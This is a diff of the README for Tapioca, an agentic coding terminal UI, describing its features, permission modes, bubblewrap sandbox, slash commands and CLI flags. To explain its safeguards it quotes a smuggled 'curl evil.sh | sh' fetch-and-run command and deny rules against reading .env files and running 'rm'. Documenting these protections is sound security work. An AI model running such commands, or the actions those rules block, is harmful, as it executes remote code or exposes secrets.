@@ -1,345 +1,117 @@
 # Tapioca
 
-An agentic coding TUI in the spirit of Claude Code, Crush and OpenCode, built
-with [Bubble Tea](https://github.com/charmbracelet/bubbletea).
+An agentic coding TUI: a model that reads, writes and runs things in your
+project, with every mutating call behind a permission prompt — and the state of
+the session on screen while it works.
 
-Chat fills two thirds of the screen; the right third is a stack of
-**configurable dashboards** (agents, tokens/context/cost, the agent's plan,
-tool calls, MCP servers, session, editable settings). Agents can read, write
-and edit files and run shell commands — every mutating call goes through a
-permission prompt.
+![Tapioca fixing operator precedence in a parser](assets/demo.gif)
 
-```
-┌ title: session · cwd · provider:model · effort · max tokens ──────────┐
-│ ● 1·agent-1   ● 2·agent-2                                             │
-│ ╭─ chat (2/3) ─────────────────────────────╮ ╭─ dashboards (1/3) ───╮ │
-│ │ | you                                    │ │ agents               │ │
-│ │ fix the failing parser test              │ │ tokens  ctx ██░ 41%  │ │
-│ │                                          │ │         cost $0.0214 │ │
-│ │ | agent-1 · claude-sonnet-5              │ │ tool calls           │ │
-│ │ tool: bash go test ./parser/...          │ │ settings · editing   │ │
-│ │ bash -> ok                               │ ╰──────────────────────╯ │
-│ │ ──────────────────────────────────────── │                          │
-│ │ | /diff                                  │                          │
-│ ╰──────────────────────────────────────────╯                          │
-│ status: hints / flash messages · agent status · tok/s                 │
-└───────────────────────────────────────────────────────────────────────┘
+**[Documentation →](https://juacamole.github.io/tapioca-docs/guide/what-is-tapioca)**
+
+```sh
+go build -o tapioca .   # or: nix run .
+tapioca                 # in any project directory
 ```
 
-## What it does
+With [Ollama](https://ollama.com) running it works out of the box — no key, no
+account, no network beyond localhost. Anthropic, Bedrock, Vertex AI, Azure
+OpenAI, Gemini and any OpenAI-compatible server also work; switching is one
+`/model`. Needs Go 1.26+ to build.
 
-- **Built-in coding tools** — `bash`, `read_file`, `write_file`, `edit_file`
-  run in the working directory (`/cd` to move it), with **`grep`** (regex
-  search, ripgrep when installed) and **`glob`** (`**/*.go`, newest first)
-  for navigation, plus keyless **`web_search`** (DuckDuckGo) and
-  **`web_fetch`** (readable page text) for research; the read-only tools
-  need no permission and work in plan mode. On multi-step work the agent
-  keeps a **todo list** (`todo_write`), shown live in the `plan` panel and
-  saved with the session.
-- **Permission modes** — cycle with `shift+tab`, shown in the status bar
-  (see [SECURITY.md](SECURITY.md) for what each one actually enforces):
-  - `plan` — no file modifications; bash asks; the agent is instructed to
-    investigate read-only and present a plan
-  - `manual` — every mutating tool call prompts (allow once / always / deny)
-  - `auto` — file edits auto-approved, bash still asks
-  - `bypass` — everything runs without asking (containers/throwaway VMs;
-    it disables the exfiltration and grant safeguards too)
+## What it does differently
 
-  Secrets outside the worktree and first-contact web hosts prompt even in
-  `auto`, provider API keys are hidden from tool subprocesses, and stored
-  sessions/memory/checkpoints are owner-only on disk.
-- **Per-tool permission rules** — the mode is the default; `[permissions]`
-  is where the exceptions go, each rule a tool and what the call is about:
+**The session's cost is on screen, not behind a command.** Context fill,
+spend, the agent's plan, recent tool calls with their arguments, git status and
+changed files stay visible while the agent streams. The panels are
+configuration — pick them with `/panels`, dock them on any side, edit settings
+in place and have every change written back to your config file, comments
+intact.
 
-  ```toml
-  [permissions]
-  allow = ["bash(go test*)", "edit_file(internal/**)"]
-  ask   = ["bash(git push*)"]
-  deny  = ["read_file(**/.env)", "bash(rm *)", "mcp:*__delete_*"]
-  ```
+**A threat model, not a permission prompt.** [SECURITY.md](SECURITY.md) says
+what is enforced *and what is not*. Deny rules hold in every mode including
+`bypass`; compound commands are approved segment by segment, so an allow rule
+for `go test*` can't be ridden in on by `go test ./... && curl evil.sh | sh`;
+`read_file` gates secrets even though it never otherwise prompts; provider keys
+are scrubbed from every subprocess. With `sandbox = true`, bash runs under
+bubblewrap with `$HOME` replaced by an empty tmpfs — `.ssh` isn't gated, it's
+absent.
 
-  Paths glob with `**` across directories, everything else with `*`. A
-  **deny** holds in every mode, `bypass` included, and covers the read-only
-  tools that never prompt; an **ask** forces a prompt `auto` would have
-  skipped and outranks an earlier "always allow"; an **allow** skips one,
-  except in plan mode. Compound bash commands are matched segment by segment,
-  so `bash(go test*)` cannot be ridden in on by `go test ./... && curl …`.
-  Match the command rather than one spelling of it — `bash(rm -rf*)` misses
-  `rm -fr` — and see [SECURITY.md](SECURITY.md) for what a rule does and does
-  not buy you.
-- **Sandboxed bash** (`sandbox = true` or `--sandbox`) — runs shell commands
-  under bubblewrap with the worktree writable, the rest of the filesystem
-  read-only and **`$HOME` replaced by an empty tmpfs**, so `.ssh`/`.aws`
-  aren't merely gated, they're absent. Missing `bwrap` fails loudly instead
-  of quietly running unconfined.
-- **Providers** — Ollama, Anthropic, **Bedrock** (`type = "bedrock"`) and
-  **Vertex AI** (`type = "vertex"`) for Anthropic models on AWS/GCP,
-  **Azure OpenAI** (`type = "azure"`),
-  **Gemini** (`type = "gemini"`, via Google's OpenAI-compatible endpoint), and
-  any other **OpenAI-compatible** server (LM Studio, vLLM, llama.cpp,
-  OpenRouter, OpenAI) via `type = "openai"`.
-  All stream, all support tool calls and thinking where the backend does.
-- **LSP diagnostics** — configure language servers under `[[lsp]]` and every
-  file the agent writes is checked; errors come back attached to the tool
-  result (`4:2 error: undefined: doesNotExist`), so it fixes them in the same
-  turn rather than after a build.
-- **MCP** — stdio servers *and* remote **streamable HTTP** servers (with
-  auth headers; `${VAR}` expands so tokens stay out of the config file);
-  their tools are namespaced `server__tool` and offered alongside the
-  built-ins, and a server that announces `tools/list_changed` is re-read
-  without a restart. A server's **prompts** become slash commands
-  (`/server__prompt`) and its **resources** attach like files
-  (`@server:uri`), so both arrive through the doors you already use.
-  Protocol revision is negotiated (2025-06-18 down to 2024-11-05).
-- **Multi-agent** — independent agents with their own provider, model,
-  system prompt, goal, history and stats; they stream concurrently.
-  `/fork` branches the current conversation into a new agent.
-- **Subagents** — the model can delegate a self-contained task with
-  `spawn_agent`: it runs in its own tab with a fresh context window and only
-  its final answer comes back, so wide searches never flood the main
-  conversation. Subagents cannot spawn their own.
-- **External edits are respected** — if you change a file in your own editor
-  after the agent read it, `write_file`/`edit_file` refuse to overwrite it
-  until the agent re-reads, and the next prompt carries a note listing what
-  changed.
-- **Background commands** — `bash` takes `background: true` for a dev server
-  or a long build; `bash_output` collects what it has produced since last
-  asked and `bash_kill` stops it. Polling never re-prompts, and jobs are
-  killed when Tapioca exits.
-- **Edits show as diffs** — when the agent writes or edits a file the chat
-  shows `updated main.go (+1 -1)` and the changed lines, coloured, with a
-  little context; the model still gets the terse result, so the diff costs
-  no context.
-- **Conversation mechanics** — `/regen` regenerates the last response,
-  `/edit` pulls the last prompt back into the input, `up` recalls prompt
-  history, and prompts typed while the agent is busy are **queued** and sent
-  automatically when it finishes.
-- **Context & cost visibility** — the tokens panel shows a context-fill
-  gauge (window size per provider, `context_window` to override) and an
-  estimated session cost from a configurable `[costs]` price table.
-  `/compact` summarizes the conversation to free context.
-- **Dashboards** — focus with `tab`, edit settings in place (model picker,
-  permission mode, max tokens, temperature, thinking, budget, tools,
-  verbose, dashboard side); every change is applied live and **written back
-  to the config file**. The dashboard can dock **right, left, top or
-  bottom** (`position` in config or the "dash side" setting), and panels are
-  reordered with left/right inside the panel picker (`p`).
-- **Git panels** — a `git` panel (branch, ahead/behind, last commit, change
-  counts) and a `changes` panel (IntelliJ/VSCode-style file list with
-  staged/unstaged/untracked coloring), refreshed automatically and after
-  every agent turn; `/diff` shows the full diff.
-- **Copy & selection** — drag with the mouse over the chat to mark text; it
-  is copied on release (wl-copy/xclip/pbcopy, OSC 52 fallback). In chat
-  focus `y` copies the last response and `Y` the whole transcript. `f3`
-  releases the mouse entirely for native terminal selection.
-- **Themes & glyphs** — `/theme` picks a palette (`taro`, `contrast` —
-  colorblind-safe Okabe-Ito, `mono` — no color at all), `/glyphs` picks the
-  character set: `unicode` (default), `ascii` (renders in *any* terminal or
-  font, borders included) or `nerd` (icons, needs a patched font). Every
-  color is overridable with a hex code under `[colors]`, per background if
-  you want (`"#light/#dark"`). Both switch live and are saved.
-- **Custom commands** — drop a markdown file in `~/.config/tapioca/commands/`
-  or `.tapioca/commands/` in a project and its name becomes a slash command;
-  the first `# heading` is its description and `$ARGUMENTS` takes whatever you
-  type after it. Project commands override personal ones.
-- **/settings** — opens the config file in vim/$EDITOR and hot-reloads it on
-  save (keybinds, providers, defaults, layout, theme — applied live).
-- **Editor mode (ACP)** — `tapioca --acp` speaks the
-  [Agent Client Protocol](https://agentclientprotocol.com) on stdio, so Zed
-  and other ACP clients can drive Tapioca as their agent: streamed replies,
-  tool calls with status, the todo list as a plan, and permission prompts
-  rendered by the editor.
-- **Sessions** — the whole workspace autosaves; `/resume` opens a picker
-  whose filter searches **across the text of all saved conversations**.
-  Sessions remember the project they belong to: `-c` continues this
-  directory's latest, and `/resume` lists it first.
-  Titles are written by the model from your first prompt (`title_model` to
-  point that at a cheaper one), falling back to truncation.
-- **Project instructions** — `AGENTS.md` (also `TAPIOCA.md`, and other tools'
-  `CLAUDE.md`/`GEMINI.md`/`CRUSH.md`) are read from the repository root down
-  to the working directory, plus a global one in the config dir; `@path` on
-  its own line inlines another file.
-- **Vim everywhere** — `ctrl+e` edits the prompt, `ctrl+g` the system
-  prompt, in `$EDITOR`/nvim/vim. Verbose vs compact transcripts on `ctrl+o`.
+**Agents that actually run at once.** Each has its own provider, model, prompt,
+history and stats, streaming in its own goroutine. `/fork` branches a
+conversation without losing the original, and `spawn_agent` delegates work to a
+subagent whose noise never reaches your context window.
+
+**It respects the terminal.** Drag to select and it copies on release — no copy
+mode, no prefix key. `ascii` glyphs render in any terminal and font, borders
+included; `mono` drops color entirely; `contrast` is colorblind-safe Okabe-Ito.
+Default keybinds avoid `alt`, so they work on macOS.
+
+**Safety nets for real work.** Edit a file in your own editor and the agent's
+stale writes are refused until it re-reads. Everything it writes is checked by
+your language servers, with errors attached to the tool result so they're fixed
+in the same turn. `/rewind` restores the worktree from a checkpoint.
+
+**One binary.** `tapioca --acp` speaks the
+[Agent Client Protocol](https://agentclientprotocol.com), so Zed and other ACP
+editors drive the same build. It reads `AGENTS.md`, `CLAUDE.md`, `GEMINI.md`
+and `CRUSH.md`, so instructions written for other tools work unchanged.
 
 ## Slash commands
 
-Type `/` for the completion popup:
-
-| Command | Effect |
+| | |
 |---|---|
-| `/model [provider:]name` | switch model (no arg opens the picker) |
-| `/effort off\|low\|medium\|high` | set thinking effort |
-| `/goal text` · `/goal clear` | pin a goal into the system prompt |
+| `/help` | keybinds and commands |
+| `/model [provider:]name` | switch model (no argument opens a picker) |
+| `/effort off\|low\|medium\|high` | thinking effort |
+| `/thinking` | toggle thinking |
+| `/tools` | toggle tools for this agent |
+| `/agent [name]` | new agent |
+| `/fork` | fork this conversation into a new agent |
+| `/goal text \| clear` | set a session goal |
 | `/btw note` | add context without asking for a reply |
-| `/cd dir` | change the working directory |
-| `/diff` | scrollable git diff (staged + unstaged) |
-| `/clear` | clear this agent's conversation |
+| `/remember fact \| clear` | persist a project fact |
+| `/systemprompt` | edit the system prompt |
+| `/regen` | regenerate the last response |
+| `/edit` | pull the last prompt back into the input |
 | `/compact` | summarize the conversation to free context |
-| `/regen` · `/edit` | redo / rewrite the last exchange |
-| `/fork` · `/agent [name]` | branch conversation / new agent |
-| `/resume [id]` · `/new` · `/save` | session management |
-| `/theme [name]` · `/glyphs [name]` | palette / character set (no arg: picker) |
-| `/verbose` · `/thinking` · `/tools` · `/zen` | toggles |
-| `/help` · `/quit` | the obvious |
+| `/clear` | clear this agent's conversation |
+| `/cd dir` | change the working directory |
+| `/diff` | git diff of the working directory |
+| `/permissions` | what runs without approval |
+| `/checkpoints` | pick a checkpoint to rewind to |
+| `/rewind [n\|id]` | rewind file changes |
+| `/new` | fresh session |
+| `/save` | save the session |
+| `/resume [id]` | resume a saved session |
+| `/settings` | edit the config file; reloads on save |
+| `/panels` | choose and order dashboard panels |
+| `/theme [name]` | color theme |
+| `/glyphs [name]` | `unicode`, `ascii` or `nerd` |
+| `/verbose` | full thoughts and tool output in chat |
+| `/zen` | hide keybind hints |
+| `/quit` | save and exit |
 
-## Keybinds (defaults, no alt — mac friendly)
+Drop a markdown file in `~/.config/tapioca/commands/` or `.tapioca/commands/`
+and its name becomes a command of your own.
 
-| Action | Keys | | Action | Keys |
-|---|---|---|---|---|
-| send | `enter` | | new agent | `ctrl+n` |
-| newline | `shift+enter` (`ctrl+j`) | | next / prev agent | `ctrl+→` / `ctrl+←` |
-| stop · clear · quit (2x) | `ctrl+c` | | close agent | `ctrl+w` |
-| cancel / close overlay | `esc` | | toggle dashboards | `ctrl+b` |
-| cycle permission mode | `shift+tab` | | cycle focus | `tab` (or click) |
-| verbose chat | `ctrl+o` | | move focused panel | `shift+arrows` |
-| scroll output | `pgup` / `pgdown` | | | |
-| edit prompt in vim | `ctrl+g` | | help | `f1` |
-| toggle thinking | `ctrl+t` | | |
-
-Sessions, model picking, the system prompt and panel management live in
-slash commands: `/new`, `/save`, `/resume`, `/model`, `/panels`,
-`/systemprompt`, `/settings`.
-
-`pgup`/`pgdown` and the mouse wheel scroll the transcript **whatever has
-focus**, so you can read back while a prompt is half-typed. Thoughts collapse
-to `› thought (210 tok)`; **click that line to expand just that one**, click
-again to fold it back (`ctrl+o` still expands everything at once).
-
-**Marking text in the chat copies it automatically** — drag with the mouse,
-and the moment you let go it is on the clipboard (the mark stays highlighted
-until the next click). In chat focus: `j/k` scroll, `u/d` page, `g/G`
-top/bottom, `y`/`Y` copy last response/transcript. Clicking a pane focuses
-it (the chat drops you into write mode); clicking a dashboard panel selects
-it, and `enter` on the settings panel edits its rows.
-
-`ctrl+c` behaves like Claude Code: one press stops a running generation;
-idle it clears the input; a second press within two seconds exits (with
-autosave). Everything is rebindable under `[keys]`.
-
-**shift+enter**: most terminals cannot transmit shift+enter distinctly —
-same limitation Claude Code solves with `/terminal-setup`. Map it to a
-literal newline in your terminal and Tapioca picks it up (it equals
-`ctrl+j`). Kitty: `map shift+enter send_text all \n` in kitty.conf.
-Otherwise `ctrl+j` always works.
-
-## Build & run
-
-With nix (flake):
+## CLI
 
 ```sh
-nix run .                          # run straight from the repo
-nix build .                        # binary at ./result/bin/tapioca
-nix develop                        # dev shell: go, gopls, gh, tmux, python3
-nix profile install .              # install onto your PATH
+tapioca -c                          # continue the most recent session
+tapioca -r [id]                     # resume (no id opens a picker)
+tapioca -p "fix the failing test"   # headless: one prompt, print, exit
+tapioca --permission-mode plan      # plan | manual | auto | bypass
+tapioca --sandbox                   # confine bash with bubblewrap
+tapioca --acp                       # serve ACP on stdio, for editors
 ```
 
-Without nix:
+Full flag list, configuration and keybinds are in the
+[documentation](https://juacamole.github.io/tapioca-docs/reference/cli).
 
-```sh
-go build -o tapioca .              # build (needs the repo dir for go.mod)
-cp tapioca ~/.npm-global/bin/      # or any directory on your PATH
-```
+## Contributing
 
-CLI (Claude-style flags):
+See [CONTRIBUTING.md](CONTRIBUTING.md). Security issues: please read
+[SECURITY.md](SECURITY.md) first — it documents the threat model and how to
+report privately.
 
-```sh
-tapioca                            # new session in the current directory
-tapioca -c                         # continue the most recent session
-tapioca -r                         # pick a session to resume
-tapioca -r 20260806-135204         # resume a specific session
-tapioca --fork-session -c          # continue, but into a new session id
-tapioca --model ollama:qwen3       # model for this run
-tapioca --permission-mode plan     # start in plan mode
-tapioca --dangerously-skip-permissions   # bypass all tool prompts
-tapioca --sandbox                  # confine bash to the worktree (bubblewrap)
-tapioca -p "fix the failing test"  # headless: run one prompt, print, exit
-tapioca -p "summarize" --output-format json --max-turns 5
-tapioca --system-prompt "..." --append-system-prompt "..."
-tapioca --settings alt.toml --mcp-config mcp.toml --add-dir ../lib
-tapioca --list-sessions
-tapioca --acp                      # serve ACP on stdio (editors launch this)
-```
-
-To use it from Zed, point an ACP agent server at the binary:
-
-```json
-{ "agent_servers": { "Tapioca": { "command": "tapioca", "args": ["--acp"] } } }
-```
-
-Without an editor, `sh scripts/acp-probe.sh "your prompt"` drives the protocol
-from a shell and prints the updates an editor would have rendered.
-
-Builds for Linux, macOS and Windows; the shell tools expect a POSIX `sh`,
-so on Windows install Git for Windows or WSL (`cmd.exe` is the fallback).
-
-Requires Go 1.26+ to build. `go run .`/`go build` must run inside the repo
-(Go needs `go.mod`); the compiled binary has no such requirement — install
-it on your PATH and start it from any project directory, which becomes the
-agent's working directory.
-
-With Ollama running locally it works out of the box.
-
-## Configuration
-
-`~/.config/tapioca/config.toml` — created on first run and **kept up to date
-by the app** (settings dashboard, model picker, toggles and the system
-prompt editor all write back). Sessions live in
-`~/.local/share/tapioca/sessions/`. Things typically set once by hand:
-
-```toml
-permission_mode = "manual"         # plan | manual | auto | bypass
-
-theme = "taro"                     # taro | contrast | mono
-glyphs = "unicode"                 # unicode | ascii | nerd
-
-[colors]                           # override any theme color with hex
-accent = "#6C4FD8/#A78BFA"         # "#hex" for both, "#light/#dark" to differ
-agents = "#A78BFA, #7CC7FF"        # per-agent identity colors, cycled
-
-[providers.lmstudio]
-type = "openai"                    # any OpenAI-compatible server
-base_url = "http://localhost:1234"
-context_window = 32768
-
-[[mcp]]
-name = "filesystem"
-command = "npx"
-args = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
-
-[[mcp]]                            # or a remote server over HTTP
-name = "example"
-url = "https://mcp.example.com/mcp"
-  [mcp.headers]
-  Authorization = "Bearer ${EXAMPLE_MCP_TOKEN}"
-
-[costs."claude-sonnet"]            # $ per Mtok, matched by model prefix
-in = 3.0
-out = 15.0
-
-[keys]
-save_session = "ctrl+s,f5"
-```
-
-## Architecture
-
-```
-main.go                  flags, config, executor cwd, session resume
-internal/config          TOML config: load, defaults, Save (written by the app)
-internal/provider        Provider interface; ollama (NDJSON), anthropic (SSE),
-                         openai-compatible (SSE)
-internal/tools           built-in bash/read/write/edit tools + permission gate
-internal/mcp             stdio JSON-RPC 2.0 MCP client + tool registry
-internal/agent           agent runtime (stream → tool loop → events), manager,
-                         fork, permission events
-internal/session         workspace snapshots as JSON + full-text search blobs
-internal/stats           token / request / tool-call accounting
-internal/ui              Bubble Tea app: chat, dashboards, slash commands,
-                         pickers, permission & diff overlays, vim integration
-internal/acp             Agent Client Protocol server (--acp) for editors
-internal/lsp             language servers: diagnostics after each edit
-```
-
-Each agent streams in its own goroutine and reports through a channel; the
-UI consumes events so several agents can generate at once. Permission
-requests travel the same channel and block the agent until answered.
+MIT licensed.
